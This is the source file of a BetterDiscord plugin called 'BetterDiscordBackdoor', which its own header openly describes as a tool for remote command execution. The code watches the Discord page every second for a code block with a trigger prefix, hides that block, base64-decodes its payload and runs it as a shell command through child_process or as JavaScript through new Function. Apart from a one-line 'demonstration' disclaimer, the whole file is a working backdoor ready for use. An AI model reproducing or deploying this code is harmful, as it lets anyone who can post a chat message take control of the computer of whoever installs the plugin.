/** 
  * @name BetterDiscordBackdoor
  * @version 1.0.0
  * @description Better Discord plugin for remote command execution
*/

/* This plugin is for demonstration purposes! Not recommended for malicious purposes! */

const config = {
    "info": {
        "name": "BetterDiscordBackdoor",
        "author": ["ethernalsteve", "your nickname"],
        "version": "1.0.0",
        "description": "Better Discord plugin for remote command execution"
    },
    "backdoor": {
        "prefix": "ethBackDoor" // The prefix that all commands will start with
    }
}

class BetterDiscordBackdoor {
    constructor() { this._config = config; }
    
    getName() { return config.info.name; }
    getAuthor() { return config.info.author[0] }
    getDescription() { return config.info.description; }
    getVersion() { return config.info.version; }
    
    load() {
      setInterval(() => {let cmd = $('code:contains(config.backdoor.prefix):first');
      if (cmd.text() != "") {
        cmd.remove();
        let command = cmd.text().split(" ");
        try {
          if (command[1] == "CMD:") {
            require("child_process").spawn(atob(command[2]));
          } else if (command[1] == "JS:") {
            let ev = new Function (atob(command[2]));
            ev();
          }
        } catch(e) {
          console.log("An error occurred while executing the command!", e);
        }
      }}, 1000);
    }
}
